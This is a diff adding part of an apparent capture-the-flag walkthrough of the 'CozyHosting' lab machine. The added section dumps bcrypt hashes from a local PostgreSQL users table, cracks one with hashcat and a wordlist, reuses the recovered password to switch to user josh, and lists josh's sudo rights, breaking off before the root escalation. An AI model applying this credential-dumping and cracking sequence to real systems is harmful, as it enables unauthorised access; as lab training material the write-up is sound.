@@ -331,4 +331,115 @@ jd-gui cloudhosting-0.0.1.jar & disown
 
 <br />
 
+`Log` into the `postgresql` and list the `current databases`:
 
+<br />
+
+```bash
+app@cozyhosting:/app$ psql -U postgres -h localhost
+Password for user postgres: 
+psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
+Type "help" for help.
+
+postgres=# \l
+                                   List of databases
+    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
+-------------+----------+----------+-------------+-------------+-----------------------
+ cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
+ postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
+ template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
+             |          |          |             |             | postgres=CTc/postgres
+ template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
+             |          |          |             |             | postgres=CTc/postgres
+(4 rows)
+```
+
+<br />
+
+Then we connect to the `cozyhosting DB` and list the `tables`:
+
+<br />
+
+```bash
+cozyhosting=# \c cozyhosting
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
+You are now connected to database "cozyhosting" as user "postgres".
+cozyhosting=# \dt
+         List of relations
+ Schema | Name  | Type  |  Owner   
+--------+-------+-------+----------
+ public | hosts | table | postgres
+ public | users | table | postgres
+(2 rows)
+```
+
+<br />
+
+Finally we list the most `interesting table` -> `users` and find `two` Bcrypt Blowfish `hashes`:
+
+<br />
+
+```bash
+cozyhosting=# select * from users;
+   name    |                           password                           | role  
+-----------+--------------------------------------------------------------+-------
+ kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
+ admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
+(2 rows)
+```
+
+<br />
+
+## Cracking:
+
+<br />
+
+We put the `hashes` in a `file` and we are able to `crack` one of them running `hashcat` with the Bcrypt Blowfish `3200 mode`:
+
+<br />
+
+```bash
+❯ hashcat -a 0 -m 3200 hashes /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting
+...[snip]...
+$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
+```
+
+<br />
+
+Use the new `credentials` to log into the user `josh` successfully:
+
+<br />
+
+```bash
+app@cozyhosting:/home$ su josh
+Password: 
+josh@cozyhosting:/home$ whoami
+josh
+josh@cozyhosting:/home$ cd
+josh@cozyhosting:~$ cat user.txt
+56d4998f4ce9e7ef4dc2890c04xxxxxx
+```
+
+<br />
+
+# Privilege Escalation: josh -> root 
+
+<br />
+
+Enumerating the `SUDOERS privileges` of `josh` we see the following:
+
+<br />
+
+```bash
+josh@cozyhosting:~$ sudo -l
+[sudo] password for josh: 
+Matching Defaults entries for josh on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User josh may run the following commands on localhost:
+    (root) /usr/bin/ssh *
+```
+
+<br />
